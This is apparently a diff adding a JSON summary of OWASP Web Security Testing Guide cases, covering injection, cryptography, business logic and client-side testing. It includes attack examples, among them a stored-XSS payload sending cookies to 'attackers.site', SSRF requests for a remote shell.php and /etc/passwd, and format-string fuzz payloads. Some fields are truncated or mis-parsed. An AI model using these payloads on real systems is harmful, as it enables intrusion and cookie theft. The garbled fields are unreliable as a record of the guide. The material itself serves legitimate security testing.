+        "Code Review Dangerous API: Be aware of the uses of following API as it may introduce the command injection risks.",
+        "PHP: system shell_exec exec proc_open eval"
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "Commix",
+        "OWASP WebGoat",
+        "ZAP"
+      ],
+      "pages": "310-313"
+    },
+    {
+      "id": "WSTG-INPV-13",
+      "name": "Testing for Format String Injection",
+      "category": "INPV",
+      "objective": "Assess whether injecting format string conversion speciﬁers into user-controlled ﬁelds causes undesired behaviour from the application.",
+      "how_to_test": [
+        "Static Analysis: Static analysis tools can ﬁnd format string vulnerabilities in either the code or in binaries.",
+        "Manual Code Inspection: Static analysis may miss more subtle cases including format strings generated by complex code.",
+        "Conversion Speciﬁer Injection: Testers can check at the unit test or full system test level by sending conversion speciﬁers in any string input.",
+        "Manual Injection: Testers can perform a manual test using a web browser or other web API debugging tools.",
+        "Tool Assisted Fuzzing: Fuzzing tools including wfuzz can automate injection tests.",
+        "ID           Response   Lines    Word     Chars       Payload: =================================================================== 000000002: 500 0 L 5 W 142 Ch \"%25s%25s%25s%25n\" 000000003: 500 0 L 5 W 137 Ch \"%25p%25p%25p%25p%25p\" 000000004: 200 0 L 1 W 48 Ch \"%7Bevent.__init__.__globals__%5BCONFI"
+      ],
+      "tools": [
+        "wfuzz"
+      ],
+      "pages": "314-317"
+    },
+    {
+      "id": "WSTG-INPV-14",
+      "name": "Testing for Incubated Vulnerability",
+      "category": "INPV",
+      "objective": "Identify injections that are stored and require a recall step to the stored injection. Understand how a recall step could occur. Set listeners or activate the recall step if possible.",
+      "how_to_test": [
+        "Black-Box Testing",
+        "File Upload Example: Verify the content type allowed to upload to the web application and the resultant URL for the uploaded ﬁle.",
+        "XSS Example on a Bulletin Board: 1.",
+        "SQL Injection Example: Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability.",
+        "FROM table_x: WHERE field2 = 'x';",
+        "UPDATE footer: SET notice = 'Copyright 1999-2030%20 <script>document.write(\\'<img src=\"http://attackers.site/cv.jpg?\\'+document.cookie+\\'\">\\') </script>' WHERE notice = 'Copyright 1999-2030'; Now, each user browsing the site will silently send their cookies to the attackers.site.",
+        "Misconﬁgured Server: Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site.",
+        "Gray-Box Testing: Gray-box or white-box testing techniques will be the same as previously discussed."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "Metasploit",
+        "XSS-proxy",
+        "ZAP"
+      ],
+      "pages": "318-320"
+    },
+    {
+      "id": "WSTG-INPV-15",
+      "name": "Testing for HTTP Splitting Smuggling",
+      "category": "INPV",
+      "objective": "Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable. Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.",
+      "how_to_test": [
+        "Black-Box Testing",
+        "HTTP Splitting: Some web applications use part of the user input to generate the values of some headers of their responses.",
+        "Gray-Box Testing",
+        "HTTP Splitting: A successful exploitation of HTTP Splitting is greatly helped by knowing some details of the web application and of the attack target.",
+        "HTTP Smuggling: As mentioned in the introduction, HTTP Smuggling leverages the different ways that a particularly crafted HTTP message can be parsed and interpreted by different agents (browsers, web caches, application ﬁrewalls).",
+        "Application Firewall Bypass: There are several products that enable a system administration to detect and block a hostile web request depending on some known malicious pattern that is embedded in the request."
+      ],
+      "tools": [],
+      "pages": "321-324"
+    },
+    {
+      "id": "WSTG-INPV-16",
+      "name": "Testing for HTTP Incoming Requests",
+      "category": "INPV",
+      "objective": "Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests. Monitor HTTP trafﬁc without changes of end user Browser proxy or client-side application.",
+      "how_to_test": [
+        "Reverse Proxy: There is situation that we would like to monitor all HTTP incoming requests on web server but we can’t change conﬁguration on the browser or application client-side.",
+        "The testing steps: 1.",
+        "Port Forwarding: Port forwarding is another way to allow us intercept HTTP requests without changes of client-side.",
+        "TCP-level Network Trafﬁc Capture: This technique monitor all the network trafﬁc at TCP-level."
+      ],
+      "tools": [
+        "Fiddler",
+        "Ostinato",
+        "pcapteller",
+        "PowerEdit-Pcap",
+        "replayproxy",
+        "TCPProxy",
+        "WireShark",
+        "ZAP"
+      ],
+      "pages": "325-326"
+    },
+    {
+      "id": "WSTG-INPV-17",
+      "name": "Testing for Host Header Injection",
+      "category": "INPV",
+      "objective": "Assess if the Host header is being parsed dynamically in the application. Bypass security controls that rely on the header.",
+      "how_to_test": [
+        "X-Forwarded Host Header Bypass: In the event that Host header injection is mitigated by checking for invalid input injected via the Host header, you can supply the value to the X-Forwarded-Host header.",
+        "Web Cache Poisoning: Using this technique, an attacker can manipulate a web-cache to serve poisoned content to anyone who requests it.",
+        "Password Reset Poisoning: It is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token."
+      ],
+      "tools": [],
+      "pages": "327-328"
+    },
+    {
+      "id": "WSTG-INPV-18",
+      "name": "Testing for Server-side Template Injection",
+      "category": "INPV",
+      "objective": "Detect template injection vulnerability points. Identify the templating engine. Build the exploit.",
+      "how_to_test": [
+        "Identify Template Injection Vulnerability: The ﬁrst step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.",
+        "Hello user01: Using the following payload - the server response is blank “Hello”: personal_greeting=username<tag> Hello In the next step is to break out of the template statement and injecting HTML tag after it using the following payload personal_greeting=username}}<tag> Hello user01 <tag>",
+        "Identify the Templating Engine: Based on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions.",
+        "Build the RCE Exploit: The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "curl",
+        "Tplmap"
+      ],
+      "pages": "329-332"
+    },
+    {
+      "id": "WSTG-INPV-19",
+      "name": "Testing for Server-Side Request Forgery",
+      "category": "INPV",
+      "objective": "Identify SSRF injection points. Test if the injection points are exploitable. Asses the severity of the vulnerability.",
+      "how_to_test": [
+        "Load the Contents of a File: GET https://example.com/page?page=https://malicioussite.com/shell.php",
+        "Access a Restricted Page: GET https://example.com/page?page=http://localhost/admin",
+        "Or: GET https://example.com/page?page=http://127.0.0.1/admin Use the loopback interface to access content restricted to the host only.",
+        "Fetch a Local File: GET https://example.com/page?page=file:///etc/passwd",
+        "HTTP Methods Used: All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.",
+        "PDF Generators: In some cases, a server may convert uploaded ﬁles to PDF format.",
+        "Common Filter Bypass: Some applications block references to localhost and 127.0.0.1.",
+        "String obfuscation: Registering your own domain that resolves to 127.0.0.1 Sometimes the application allows input that matches a certain expression, like a domain."
+      ],
+      "tools": [],
+      "pages": "333-336"
+    },
+    {
+      "id": "WSTG-ERRH-01",
+      "name": "Testing for Improper Error Handling",
+      "category": "ERRH",
+      "objective": "Identify existing error output. Analyze the different output returned.",
+      "how_to_test": [
+        "Identify possible input points where the application is expecting data.",
+        "Analyse the expected input type (strings, integers, JSON, XML, etc.).",
+        "Fuzz every input point based on the previous steps to have a more focused test scenario.",
+        "Understand the service responding with the error message and try to make a more reﬁned fuzz list to bring out"
+      ],
+      "tools": [],
+      "pages": "337-338"
+    },
+    {
+      "id": "WSTG-ERRH-02",
+      "name": "Testing for Stack Traces",
+      "category": "ERRH",
+      "objective": "This test has been merged into: Testing for Improper Error Handling.",
+      "how_to_test": [
+        "See the merged test for full instructions."
+      ],
+      "tools": [],
+      "pages": "339-340"
+    },
+    {
+      "id": "WSTG-CRYP-01",
+      "name": "Testing for Weak Transport Layer Security",
+      "category": "CRYP",
+      "objective": "Validate the service conﬁguration. Review the digital certiﬁcate’s cryptographic strength and validity. Ensure that the TLS security is not bypassable and is properly implemented across the application.",
+      "how_to_test": [
+        "Server Conﬁguration: There are a large number of protocol versions, ciphers, and extensions supported by TLS.",
+        "RC4 ciphers (NOMORE): CBC mode ciphers (BEAST, Lucky 13)",
+        "Digital Certiﬁcates",
+        "Debian OpenSSL Predictable Random Number Generator (CVE-2008-0166)",
+        "F5 TLS POODLE (CVE-2014-8730)",
+        "Application Vulnerabilities: As well as the underlying TLS conﬁguration being securely conﬁgured, the application also needs to use it in a secure way.",
+        "Redirecting from HTTP to HTTPS: Many sites will accept connections over unencrypted HTTP, and then immediately redirect the user to the secure (HTTPS) version of the site with a 301 Moved Permanently redirect.",
+        "OWASP O-Saft: sslscan sslyze"
+      ],
+      "tools": [
+        "Nmap",
+        "OpenSSL",
+        "sslscan",
+        "sslyze",
+        "testssl",
+        "testssl.sh"
+      ],
+      "pages": "341-343"
+    },
+    {
+      "id": "WSTG-CRYP-02",
+      "name": "Testing for Padding Oracle",
+      "category": "CRYP",
+      "objective": "Identify encrypted messages that rely on padding. Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.",
+      "how_to_test": [
+        "Black-Box Testing: First the possible input points for padding oracles must be identiﬁed.",
+        "Example 2: Dg6W8OiWMIdVokIDH15T/A== results after Base64 decoding in 0e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc.",
+        "Example 3: ASP.NET throws System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.",
+        "Gray-Box Testing: Verify that all places where encrypted data from the client, that should only be known by the server, is decrypted.",
+        "Example 4: Visualization of the decryption process"
+      ],
+      "tools": [
+        "Bletchley",
+        "PadBuster",
+        "Poracle",
+        "python-paddingoracle"
+      ],
+      "pages": "344-346"
+    },
+    {
+      "id": "WSTG-CRYP-03",
+      "name": "Testing for Sensitive Information Sent via Unencrypted Channels",
+      "category": "CRYP",
+      "objective": "Identify sensitive information transmitted through the various channels. Assess the privacy and security of the channels used.",
+      "how_to_test": [
+        "Various types of information that must be protected, could be transmitted by the application in clear text.",
+        "It is possible to check if this information is transmitted over HTTP instead of HTTPS, or whether weak ciphers are used.",
+        "See more information about insecure transmission of credentials OWASP Top 10 2017 A3-Sensitive Data Exposure or Transport Layer Protection Cheat Sheet.",
+        "Example 1: Basic Authentication over HTTP A typical example is the usage of Basic Authentication over HTTP.",
+        "When using Basic Authentication, user credentials are encoded rather than encrypted, and are sent as HTTP headers.",
+        "In the example below the tester uses curl to test for this issue.",
+        "</body></html> Example 2: Form-Based Authentication Performed over HTTP Another typical example is authentication forms which transmit user authentication credentials over HTTP.",
+        "In the example below one can see HTTP being used in the action attribute of the form."
+      ],
+      "tools": [
+        "curl",
+        "Identity Finder",
+        "TCPDUMP",
+        "Wireshark"
+      ],
+      "pages": "347-349"
+    },
+    {
+      "id": "WSTG-CRYP-04",
+      "name": "Testing for Weak Encryption",
+      "category": "CRYP",
+      "objective": "Provide a guideline for the identiﬁcation weak encryption or hashing uses and implementations.",
+      "how_to_test": [
+        "Basic Security Checklist: When using AES128 or AES256, the IV (Initialization Vector) must be random and unpredictable.",
+        "Minimum Key length requirements: Key exchange: Diffie–Hellman key exchange with minimum 2048 bits Message Integrity: HMAC-SHA2 Message Hash: SHA2 256 bits Asymmetric encryption: RSA 2048 bits Symmetric-key algorithm: AES 128 bits Password Hashing: PBKDF2, Scrypt, Bcrypt ECDH, ECDSA: 256 bits Uses of",
+        "Source Code Review: Search for the following keywords to identify use of weak algorithms: MD4, MD5, RC4, RC2, DES, Blowfish, SHA- 1, ECB",
+        "RSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)",
+        "RSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048): Search for ECB, it’s not allowed to be used in padding.",
+        "Hard-coded sensitive information: User related keywords: name, root, su, sudo, admin, superuser, login, username, uid Key related keywords: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, cryto, base64 Other common sensitive keywords: sysadmin, root, privil"
+      ],
+      "tools": [
+        "Burp",
+        "Cookie Editor",
+        "CWE-261",
+        "CWE-323",
+        "CWE-326",
+        "CWE-327",
+        "CWE-328",
+        "CWE-329",
+        "CWE-330",
+        "CWE-347",
+        "CWE-354",
+        "CWE-547",
+        "following cases",
+        "Google",
+        "Nessus",
+        "Tamper Data",
+        "Web Developer"
+      ],
+      "pages": "350-356"
+    },
+    {
+      "id": "WSTG-BUSL-01",
+      "name": "Test Business Logic Data Validation",
+      "category": "BUSL",
+      "objective": "Identify data injection points. Validate that all checks are occurring on the back end and can’t be bypassed. Attempt to break the format of the expected data and analyze how the application is handling it.",
+      "how_to_test": [
+        "Generic Test Method Review the project documentation and use exploratory testing looking for data entry points or hand off points between systems or software.",
+        "Once found try to insert logically invalid data into the application/system.",
+        "Speciﬁc Testing Method: Perform front-end GUI Functional Valid testing on the application to ensure that the only “valid” values are accepted.",
+        "Using an intercepting proxy observe the HTTP POST/GET looking for places that variables such as cost and quality are passed.",
+        "Speciﬁcally, look for “hand-offs” between application/systems that may be possible injection or tamper points.",
+        "Once variables are found start interrogating the ﬁeld with logically “invalid” data, such as social security numbers or unique identiﬁers that do not exist or that do not ﬁt the business logic.",
+        "This testing veriﬁes that the server functions properly and does not accept logically invalid data."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "ZAP"
+      ],
+      "pages": "357-358"
+    },
+    {
+      "id": "WSTG-BUSL-02",
+      "name": "Test Ability to Forge Requests",
+      "category": "BUSL",
+      "objective": "Review the project documentation looking for guessable, predictable, or hidden functionality of ﬁelds. Insert logically valid data in order to bypass normal business logic workﬂow.",
+      "how_to_test": [
+        "Through Identifying Guessable Values Using an intercepting proxy observe the HTTP POST/GET looking for some indication that values are incrementing at a regular interval or are easily guessable.",
+        "If it is found that some value is guessable this value may be changed and one may gain unexpected visibility.",
+        "Through Identifying Hidden Options Using an intercepting proxy observe the HTTP POST/GET looking for some indication of hidden features such as debug that can be switched on or activated.",
+        "If any are found try to guess and change these values to get a different application response or behavior."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "ZAP"
+      ],
+      "pages": "359-360"
+    },
+    {
+      "id": "WSTG-BUSL-03",
+      "name": "Test Integrity Checks",
+      "category": "BUSL",
+      "objective": "Review the project documentation for components of the system that move, store, or handle data. Determine what type of data is logically acceptable by the component and what types the system should guard against. Determine who should be allowed to modify or read that data in each component. Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workﬂow.",
+      "how_to_test": [
+        "Speciﬁc Testing Method 1: Using a proxy capture HTTP trafﬁc looking for hidden ﬁelds.",
+        "Speciﬁc Testing Method 2: Using a proxy capture HTTP trafﬁc looking for a place to insert information into areas of the application that are non-editable.",
+        "Speciﬁc Testing Method 3: List components of the application or system that could be impacted, for example logs or databases."
+      ],
+      "tools": [
+        "Burp",
+        "Burp Suite",
+        "ZAP"
+      ],
+      "pages": "361-363"
+    },
+    {
+      "id": "WSTG-BUSL-04",
+      "name": "Test for Process Timing",
+      "category": "BUSL",
+      "objective": "Review the project documentation for system functionality that may be impacted by time. Develop and execute misuse cases.",
+      "how_to_test": [
+        "The tester should identify which processes are dependent on time, whether it was a window for a task to be completed, or if it was execution time between two processes that could allow the bypass of certain controls.",
+        "Following that, it is best to automate the requests that will abuse the above discovered processes, as tools are better ﬁt to analyze the timing and are more precise than manual testing.",
+        "If this is not possible, manual testing could still be used.",
+        "The tester should draw a diagram of how the process ﬂows, the injection points, and prepare the requests before hand to launch them at the vulnerable processes.",
+        "Once done, close analysis should be done to identify differences in the process execution, and if the process is misbehaving against the agreed upon business logic."
+      ],
+      "tools": [],
+      "pages": "364-366"
+    },
+    {
+      "id": "WSTG-BUSL-05",
+      "name": "Test Number of Times a Function Can Be Used Limits",
+      "category": "BUSL",
+      "objective": "Identify functions that must set limits to the times they can be called. Assess if there is a logical limit set on the functions and if it is properly validated.",
+      "how_to_test": [
+        "Review the project documentation and use exploratory testing looking for functions or features in the application or system that should not be executed more that a single time or speciﬁed number of times during the business logic workﬂow.",
+        "For each of the functions and features found that should only be executed a single time or speciﬁed number of times during the business logic workﬂow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.",
+        "For example, can a user navigate back and forth through the pages multiple times executing a function that should only execute once?",
+        "or can a user load and unload shopping carts allowing for additional discounts."
+      ],
+      "tools": [],
+      "pages": "367-368"
+    },
+    {
+      "id": "WSTG-BUSL-06",
+      "name": "Testing for the Circumvention of Work Flows",
+      "category": "BUSL",
+      "objective": "Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic ﬂow. Develop a misuse case and try to circumvent every logic ﬂow identiﬁed.",
+      "how_to_test": [
+        "Testing Method 1 Start a transaction going through the application past the points that triggers credits/points to the users account.",
+        "Cancel out of the transaction or reduce the ﬁnal tender so that the point values should be decreased and check the points/ credit system to ensure that the proper points/credits were recorded.",
+        "Testing Method 2 On a content management or bulletin board system enter and save valid initial text or values.",
+        "Then try to append, edit and remove data that would leave the existing data in an invalid state or with invalid values to ensure that the user is not allowed to save the incorrect information.",
+        "Some “invalid” data or information may be speciﬁc words (profanity) or speciﬁc topics (such as political issues)."
+      ],
+      "tools": [],
+      "pages": "369-370"
+    },
+    {
+      "id": "WSTG-BUSL-07",
+      "name": "Test Defenses Against Application Misuse",
+      "category": "BUSL",
+      "objective": "Generate notes from all tests conducted against the system. Review which tests had a different functionality based on aggressive input. Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.",
+      "how_to_test": [
+        "Changed responses",
+        "Blocked requests: Actions that log a user out or lock their account These may only be localized.",
+        "Forced browsing: Bypassing presentation layer input validation Multiple access control errors Additional, duplicated or missing parameter names Multiple input validation or business logic veriﬁcation failures with values that cannot be the result user mistakes or typos Structured data (e.g."
+      ],
+      "tools": [],
+      "pages": "371-372"
+    },
+    {
+      "id": "WSTG-BUSL-08",
+      "name": "Test Upload of Unexpected File Types",
+      "category": "BUSL",
+      "objective": "Review the project documentation for ﬁle types that are rejected by the system. Verify that the unwelcomed ﬁle types are rejected and handled safely. Verify that ﬁle batch uploads are secure and do not allow any bypass against the set security measures.",
+      "how_to_test": [
+        "Speciﬁc Testing Method Study the applications logical requirements.",
+        "Prepare a library of ﬁles that are “not approved” for upload that may contain ﬁles such as: jsp, exe, or HTML ﬁles containing script.",
+        "In the application navigate to the ﬁle submission or upload mechanism.",
+        "Submit the “not approved” ﬁle for upload and verify that they are properly prevented from uploading Check if the website only do ﬁle type check in client-side JavaScript Check if the website only check the ﬁle type by “Content-Type” in HTTP request.",
+        "Check if the website only check by the ﬁle extension.",
+        "Check if other uploaded ﬁles can be accessed directly by speciﬁed URL.",
+        "Check if the uploaded ﬁle can include code or script injection.",
+        "Check if there is any ﬁle path checking for uploaded ﬁles."
+      ],
+      "tools": [],
+      "pages": "373-374"
+    },
+    {
+      "id": "WSTG-BUSL-09",
+      "name": "Test Upload of Malicious Files",
+      "category": "BUSL",
+      "objective": "Identify the ﬁle upload functionality. Review the project documentation to identify what ﬁle types are considered acceptable, and what types would be considered dangerous or malicious. If documentation is not available then consider what would be appropriate based on the purpose of the application. Determine how the uploaded ﬁles are processed. Obtain or create a set of malicious ﬁles for testing. Try to upload the malicious ﬁles to the application and determine whether it is accepted and processed.",
+      "how_to_test": [
+        "Malicious File Types: The simplest checks that an application can do are to determine that only trusted types of ﬁles can be uploaded.",
+        "Web Shells: If the server is conﬁgured to execute code, then it may be possible to obtain command execution on the server by uploading a ﬁle known as a web shell, which allows you to execute arbitrary code or operating system commands.",
+        "Filter Evasion: The ﬁrst step is to determine what the ﬁlters are allowing or blocking, and where they are implemented.",
+        "Malicious File Contents: Once the ﬁle type has been validated, it is important to also ensure that the contents of the ﬁle are safe.",
+        "Archive Directory Traversal: If the application extracts archives (such as Zip ﬁles), then it may be possible to write to unintended locations using directory traversal.",
+        "Zip Bombs: A Zip bomb (more generally known as a decompression bomb) is an archive ﬁle that contains a large volume of data.",
+        "XML Files: XML ﬁles have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks such as the billion laughs attack.",
+        "Other File Formats: Many other ﬁle formats also have speciﬁc security concerns that need to be taken into account, such as: CSV ﬁles may allow CSV injection attacks."
+      ],
+      "tools": [
+        "Metasploit"
+      ],
+      "pages": "375-379"
+    },
+    {
+      "id": "WSTG-CLNT-01",
+      "name": "Testing for DOM-Based Cross Site Scripting",
+      "category": "CLNT",
+      "objective": "Identify DOM sinks. Build payloads that pertain to every sink type.",
+      "how_to_test": [
+        "JavaScript applications differ signiﬁcantly from other types of applications because they are often dynamically generated by the server.",
+        "To understand what code is being executed, the website being tested needs to be crawled to determine all the instances of JavaScript being executed and where user input is accepted.",
+        "Many websites rely on large libraries of functions, which often stretch into the hundreds of thousands of lines of code and have not been developed in-house.",
+        "In these cases, top-down testing often becomes the only viable option, since many bottom level functions are never used, and analyzing them to determine which are sinks will use up more time than is often available.",
+        "The same can also be said for top-down testing if the inputs or lack thereof is not identiﬁed to begin with.",
+        "User input comes in two main forms: Input written to the page by the server in a way that does not allow direct XSS, and Input obtained from client-side JavaScript objects.",
+        "On the other hand, the permutations performed by JavaScript objects are fairly well understood and documented.",
+        "If someFunction in the above example were a sink, then the exploitability in the former case would depend on the ﬁltering done by the server, whereas in the latter case it would depend on the encoding done by the browser on the window.referrer object."
+      ],
+      "tools": [],
+      "pages": "380-382"
+    },
+    {
+      "id": "WSTG-CLNT-02",
+      "name": "Testing for JavaScript Execution",
+      "category": "CLNT",
+      "objective": "Identify sinks and possible JavaScript injection points.",
+      "how_to_test": [
+        "Consider the following: DOM XSS exercise The page contains the following script: <script> function loadObj(){ var cc=eval('('+aMess+')'); document.getElementById('mess').textContent=cc.message; } if(window.location.hash.indexOf('message')==-1) { var aMess='({\"message\":\"Hello User!\"})'; } else { var ..."
+      ],
+      "tools": [],
+      "pages": "383-384"
+    },
+    {
+      "id": "WSTG-CLNT-03",
+      "name": "Testing for HTML Injection",
+      "category": "CLNT",
+      "objective": "Identify HTML injection points and assess the severity of the injected content.",
+      "how_to_test": [
+        "Consider the following DOM XSS exercise http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html The HTML code contains the following script: <script src=\"../js/jquery-1.7.1.js\"></script> <script> function setMessage(){ var t=location.hash.slice(1); $(\"div[id=\"+t+\"]\")text(\"the-dom-is-now-loade..."
+      ],
+      "tools": [],
+      "pages": "385-386"
+    },
+    {
+      "id": "WSTG-CLNT-04",
+      "name": "Testing for Client-side URL Redirect",
+      "category": "CLNT",
+      "objective": "Identify injection points that handle URLs or paths. Assess the locations that the system could redirect to.",
+      "how_to_test": [
+        "When testers manually check for this type of vulnerability, they ﬁrst identify if there are client-side redirections implemented in the client-side code.",
+        "These redirections may be implemented, to give a JavaScript example, using the window.location object.",
+        "This can be used to direct the browser to another page by simply assigning a string to it.",
+        "This is demonstrated in the following snippet: var redir = location.hash.substring(1); if (redir) { window.location='http://'+decodeURIComponent(redir); } In this example, the script does not perform any validation of the variable redir which contains the user-supplied input via the query string.",
+        "Since no form of encoding is applied, this unvalidated input is passed to the windows.location object, creating a URL redirection vulnerability.",
+        "This implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string: http://www.victim.site/?#www.malicious.site With a slight modiﬁcation, the above example snippet can be vulnerable to JavaScript injection.",
+        "For reference, see DOM-based XSS."
+      ],
+      "tools": [],
+      "pages": "387-388"
+    },
+    {
+      "id": "WSTG-CLNT-05",
+      "name": "Testing for CSS Injection",
+      "category": "CLNT",
+      "objective": "Identify CSS injection points. Assess the impact of the injection.",
+      "how_to_test": [
+        "Code should be analyzed to determine if a user is permitted to inject content in the CSS context.",
+        "Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.",
+        "The following is a basic example: <a id=\"a1\">Click me</a> <b>Hi</b> <script> $(\"a\").click(function(){ $(\"b\").attr(\"style\",\"color: \" + location.hash.slice(1)); }); </script> The above code contains a source location.hash, controlled by the attacker, that can inject directly in the style attribute of an HTML element.",
+        "As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.",
+        "The following pages provide examples of CSS injection vulnerabilities: Password “cracker” via CSS and HTML5 CSS attribute reading JavaScript based attacks using CSSStyleDeclaration with unescaped input For further OWASP resources on preventing CSS injection, see the Securing Cascading Style Sheets Cheat Sheet."
+      ],
+      "tools": [],
+      "pages": "389-390"
+    },
+    {
+      "id": "WSTG-CLNT-06",
+      "name": "Testing for Client-side Resource Manipulation",
+      "category": "CLNT",
+      "objective": "Identify sinks with weak input validation. Assess the impact of the resource manipulation.",
+      "how_to_test": [
+        "Resource Type Tag/Method Sink",
+        "Frame iframe src",
+        "AJAX Request xhr.open(method, [url], true);URL",
+        "Object object data",
+        "Script script src: The most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities."
+      ],
+      "tools": [],
+      "pages": "391-392"
+    },
+    {
+      "id": "WSTG-CLNT-07",
+      "name": "Testing Cross Origin Resource Sharing",
+      "category": "CLNT",
+      "objective": "Identify endpoints that implement CORS. Ensure that the CORS conﬁguration is secure or harmless.",
+      "how_to_test": [
+        "A tool such as ZAP can enable testers to intercept HTTP headers, which can reveal how CORS is used.",
+        "Testers should pay particular attention to the origin header to learn which domains are allowed.",
+        "Also, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input."
+      ],
+      "tools": [
+        "ZAP"
+      ],
+      "pages": "393-395"
+    },
+    {
+      "id": "WSTG-CLNT-08",
+      "name": "Testing for Cross Site Flashing",
+      "category": "CLNT",
+      "objective": "Decompile and analyze the application’s code. Assess sinks inputs and unsafe method usages.",
+      "how_to_test": [
+        "Undeﬁned Variables FlashVars: FlashVars are the variables that the SWF developer planned on receiving from the web page.",
+        "Unsafe Methods: When an entry point is identiﬁed, the data it represents could be used by unsafe methods.",
+        "Exploitation by Reﬂected XSS: The swf ﬁle should be hosted on the victim’s host, and the techniques of reﬂected XSS must be used.",
+        "Using `asfunction`: You can use the special asfunction protocol to cause the link to execute an ActionScript function in a SWF ﬁle instead of opening a URL.",
+        "HTML Injection: TextField Objects can render minimal HTML by setting: tf.html = true tf.htmlText = '<tag>text</tag>' So if some part of text could be controlled by the tester, an <a> tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.",
+        "Adobe SWF Investigator",
+        "Decompiler – Flare",
+        "Disassembler – Flasm"
+      ],
+      "tools": [],
+      "pages": "396-401"
+    },
+    {
+      "id": "WSTG-CLNT-09",
+      "name": "Testing for Clickjacking",
+      "category": "CLNT",
+      "objective": "Understand security measures in place. Assess how strict the security measures are and if they are bypassable.",
+      "how_to_test": [
+        "Bypass Clickjacking Protection: If the http://www.target.site page does not appear in the inline frame, the site probably has some form of protection against clickjacking.",
+        "Double Framing: Some frame busting techniques try to break frame by assigning a value to the parent.location attribute in the “counter-action” statement.",
+        "OnBeforeUnload Event: The onBeforeUnload event could be used to evade frame busting code.",
+        "XSS Filter: Starting from Google Chrome 4.0 and from IE8 there were introduced XSS ﬁlters to protect users from reﬂected XSS attacks.",
+        "Attacker code: <iframe src=\"http://example.org/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D\">",
+        "Browser Compatibility: Since the “X-FRAME-OPTIONS” was introduced in 2009, this header is not compatible with old browser.",
+        "Internet Explorer 8.0: Firefox (Gecko) 3.6.9 (1.9.2.9)",
+        "Mobile Website Version: Also in this case, since the X-FRAME-OPTIONS has to be implemented in every page of the website, the developers may have not protected the mobile version of the website."
+      ],
+      "tools": [
+        "Google"
+      ],
+      "pages": "402-411"
+    },
+    {
+      "id": "WSTG-CLNT-10",
+      "name": "Testing WebSockets",
+      "category": "CLNT",
+      "objective": "Identify the usage of WebSockets. Assess its implementation by using the same tests on normal HTTP channels.",
+      "how_to_test": [
+        "Black-Box Testing: 1.",
+        "Example 1: Once we have identiﬁed that the application is using WebSockets (as described above) we can use the OWASP Zed Attack Proxy (ZAP) to intercept the WebSocket request and responses.",
+        "Example 2: Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server.",
+        "Gray-Box Testing: Gray-box testing is similar to black-box testing."
+      ],
+      "tools": [
+        "Google",
+        "OWASP ZAP",
+        "WebSocket",
+        "WebSocket Client",
+        "ZAP"
+      ],
+      "pages": "412-414"
+    },
+    {
+      "id": "WSTG-CLNT-11",
+      "name": "Testing Web Messaging",
+      "category": "CLNT",
+      "objective": "Assess the security of the message’s origin. Validate that it’s using safe methods and validating its input.",
+      "how_to_test": [
+        "Examine Origin Security: Testers should check whether the application code is ﬁltering and processing messages from trusted domains.",
+        "Examine Input Validation: Although the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls.",
+        "Static Code Analysis: JavaScript code should be analyzed to determine how web messaging is implemented."
+      ],
+      "tools": [],
+      "pages": "415-417"
+    },
+    {
+      "id": "WSTG-CLNT-12",
+      "name": "Testing Browser Storage",
+      "category": "CLNT",
+      "objective": "Determine whether the website is storing sensitive data in client-side storage. The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.",
+      "how_to_test": [
+        "Local Storage: window.localStorage is a global property that implements the Web Storage API and provides persistent key-value storage in the browser.",
+        "List All Key-Value Entries: for (let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i); const value = localStorage.getItem(key); console.log(`${key}: ${value}`); }",
+        "Session Storage: window.sessionStorage is a global property that implements the Web Storage API and provides ephemeral key-value storage in the browser.",
+        "List All Key-Value Entries: for (let i = 0; i < sessionStorage.length; i++) { const key = sessionStorage.key(i); const value = sessionStorage.getItem(key); console.log(`${key}: ${value}`); } IndexedDB IndexedDB is a transactional, object-oriented database intended for structured data.",
+        "Web SQL: Web SQL is deprecated since November 18, 2010 and it’s recommended that web developers do not use it.",
+        "List All Cookies: console.log(window.document.cookie);",
+        "Global Window Object: Sometimes web developers initialize and maintain global state that is available only during the runtime life of the page by assigning custom attributes to the global window object.",
